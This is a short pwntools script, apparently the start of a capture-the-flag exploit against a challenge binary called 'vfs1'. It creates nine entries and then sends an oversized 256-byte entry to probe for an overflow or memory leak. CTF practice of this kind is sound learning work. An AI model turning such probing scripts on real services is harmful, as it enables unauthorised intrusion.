#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vfs1"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def create(name, content):
    p.sendlineafter('>', '1')
    p.sendlineafter('>', name)
    p.sendlineafter('>', content)

def read(index: int):
    p.sendlineafter('>', '4')
    p.sendlineafter('>', str(index))


for  i in range(9):
    create('A' * 8, 'B' * 8)

create("C" * 8, 'D' * 256)

read("9")


p.interactive()
